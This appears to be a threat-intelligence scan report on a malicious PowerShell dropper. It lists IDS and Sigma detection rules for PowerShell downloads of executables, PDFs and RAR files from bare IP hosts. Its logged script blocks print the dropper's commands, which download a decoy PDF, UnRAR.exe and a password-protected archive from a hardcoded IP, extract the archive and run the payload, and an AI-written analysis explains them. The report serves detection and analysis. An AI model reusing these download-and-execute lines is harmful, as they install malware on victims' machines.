attributes.magic: ASCII text, with CRLF line terminators

threat_severity.level_description: Severity MEDIUM because it was considered trojan.

crowdsourced_ids_results.rule_msg: ET INFO Executable Download from dotted-quad Host
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Executable Download from dotted-quad Host"; flow:established,to_server; http.uri; content:".exe"; endswith; nocase; http.host; content:"."; offset:1; depth:3; content:"."; within:4; content:"."; within:4; pcre:"/^(?:\d{1,3}\.){3}\d{1,3}$/"; http.request_line; content:".exe HTTP/1."; fast_pattern; classtype:bad-unknown; sid:2016141; rev:9; metadata:attack_target Client_and_Server, created_at 2013_01_03, deployment Perimeter, performance_impact Significant, confidence High, signature_severity Informational, updated_at 2024_04_09;)

crowdsourced_ids_results.rule_msg: ET INFO Dotted Quad Host PDF Request
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Dotted Quad Host PDF Request"; flow:established,from_client; flowbits:isset,http.dottedquadhost; flowbits:set,http.dottedquadhost.pdf; flowbits:unset,http.dottedquadhost; http.request_line; content:".pdf HTTP/1."; nocase; fast_pattern; classtype:bad-unknown; sid:2027265; rev:5; metadata:attack_target Client_Endpoint, created_at 2019_04_23, deployment Perimeter, performance_impact Significant, confidence High, signature_severity Informational, updated_at 2022_11_21;)

crowdsourced_ids_results.rule_msg: ET INFO Dotted Quad Host RAR Request
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Dotted Quad Host RAR Request"; flow:established,from_client; flowbits:isset,http.dottedquadhost; flowbits:set,http.dottedquadhost.rar; flowbits:unset,http.dottedquadhost; http.request_line; content:".rar HTTP/1."; nocase; fast_pattern; classtype:bad-unknown; sid:2027266; rev:4; metadata:attack_target Client_Endpoint, created_at 2019_04_23, deployment Perimeter, performance_impact Significant, confidence High, signature_severity Minor, updated_at 2020_04_08;)

crowdsourced_ids_results.rule_msg: ET INFO Windows Powershell User-Agent Usage
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Windows Powershell User-Agent Usage"; flow:established,to_server; http.user_agent; content:"Mozilla/"; startswith; content:") WindowsPowerShell/"; distance:0; fast_pattern; classtype:not-suspicious; sid:2033355; rev:1; metadata:attack_target Client_Endpoint, created_at 2021_07_16, deployment Perimeter, confidence High, signature_severity Informational, updated_at 2021_07_16;)

crowdsourced_ids_results.rule_msg: ET INFO Request for EXE via Powershell
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Request for EXE via Powershell"; flow:established,to_server; http.method; content:"GET"; http.uri; content:".exe"; endswith; nocase; http.user_agent; content:"WindowsPowerShell/"; fast_pattern; reference:md5,38135f6de7042fa63df183671b09a5ee; classtype:misc-activity; sid:2043337; rev:2; metadata:attack_target Client_and_Server, created_at 2023_01_19, deployment Perimeter, confidence High, signature_severity Informational, updated_at 2023_04_20;)

crowdsourced_ids_results.rule_msg: ET INFO Request for PDF via PowerShell
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Request for PDF via PowerShell"; flow:established,to_server; http.method; content:"GET"; http.uri; content:".pdf"; endswith; http.user_agent; content:"WindowsPowerShell/"; fast_pattern; reference:md5,544a65bfe51385bb148f23a4e3f140d6; classtype:misc-activity; sid:2044024; rev:1; metadata:attack_target Client_Endpoint, created_at 2023_01_30, deployment Perimeter, performance_impact Moderate, confidence High, signature_severity Informational, updated_at 2023_01_30;)

crowdsourced_ids_results.rule_msg: FILE pdf claimed, but not pdf
crowdsourced_ids_results.rule_raw: alert http any any -> any any (msg:"FILE pdf claimed, but not pdf"; flow:established,to_client; fileext:"pdf"; filemagic:!"PDF document"; filestore; sid:22; rev:1;)

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values:
@{ScriptBlockText=Invoke-WebRequest -Uri  "http://92.119.114.128/doc.pdf" -OutFile  "$env:TEMP\Distribution Document.pdf"
Start-Process -FilePath "Distribution Document.pdf" -WorkingDirectory $env:TEMP

Invoke-WebRequest -Uri "http://92.119.114.128/Assets/UnRAR.exe" -OutFile "$env:TEMP\UnRAR.exe"

Invoke-WebRequest -Uri "http://92.119.114.128/Assets/Base/Base64/orwartde.rar" -OutFile "$env:TEMP\orwartde.rar"
cmd.exe /C "$env:TEMP\UnRAR.exe x -ppoiuytrewq1234 -o+ $env:TEMP\orwartde.rar $env:TEMP"
Start-Proc [TRUNCATED]; Path=C:\Users\Bruno\Desktop\ov4_dd_pf.ps1; ScriptBlockId=eaefa977-b33d-4c02-a9de-eff8d6a87be8; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Invoke-WebRequest -Uri  "http://92.119.114.128/doc.pdf" -OutFile  "$env:TEMP\Distribution Document.pdf"
Start-Process -FilePath "Distribution Document.pdf" -WorkingDirectory $env:TEMP

Invoke-WebRequest -Uri "http://92.119.114.128/Assets/UnRAR.exe" -OutFile "$env:TEMP\UnRAR.exe"

Invoke-WebRequest -Uri "http://92.119.114.128/Assets/Base/Base64/orwartde.rar" -OutFile "$env:TEMP\orwartde.rar"
cmd.exe /C "$env:TEMP\UnRAR.exe x -ppoiuytrewq1234 -o+ $env:TEMP\orwartde.rar $env:TEMP"
Start-Proc [TRUNCATED]; MessageTotal=1; ScriptBlockId=c908a8ca-4ad9-47eb-842d-f0776119c79e; Path=C:\Users\Bruno\Desktop\ov4_dd_pf.ps1; EventID=4104; MessageNumber=1}

crowdsourced_ai_results.analysis:
The provided PowerShell code performs a series of actions that indicate malicious intent. It begins by downloading a PDF file from a remote server and immediately opens it, which could be a tactic to lure the user into interacting with potentially harmful content. 

Subsequently, the code downloads an executable file named "UnRAR.exe" from the same remote server. This executable is likely a tool for extracting files from RAR archives. The code then downloads two RAR files, "orwartde.rar" and "enwtsv.rar", and uses the previously downloaded UnRAR tool to extract their contents. The use of a hardcoded password ("ppoiuytrewq1234") for extraction suggests that the contents are intentionally obfuscated, which is a common practice in malware distribution to prevent easy access to the files.

After extraction, the code attempts to execute the files "orwartde.exe" and "enwtsv.exe" multiple times, indicating a potential attempt to ensure that the malicious payload is run successfully. The repetitive execution of these files raises further suspicion about their nature, as it is uncommon for legitimate software to require multiple launches in quick succession.

Overall, the code exhibits behavior consistent with malware distribution and execution, including downloading files from an untrusted source, extracting potentially harmful executables, and executing them without user consent.

## Conclusion:
The analysis of the code reveals clear indicators of malicious activity, including the downloading and execution of files from a suspicious IP address. The obfuscation techniques used further support the classification of this code as malicious.

The script begins by downloading a PDF file from a specified URL to the temporary directory, and subsequently attempts to open it. It then downloads "UnRAR.exe" to the temporary directory. Next, it downloads a RAR archive named "orwartde.rar" to the temporary directory. The script uses the downloaded "UnRAR.exe" to extract the contents of "orwartde.rar", using a password, to the temporary directory. After extraction, it attempts to execute "orwartde.exe" three times from the temporary directory. Following this, the script downloads another RAR archive named "enwtsv.rar" to the temporary directory. It again uses "UnRAR.exe" with the same password to extract "enwtsv.rar" to the temporary directory. Finally, it attempts to execute "enwtsv.exe" three times from the temporary directory.
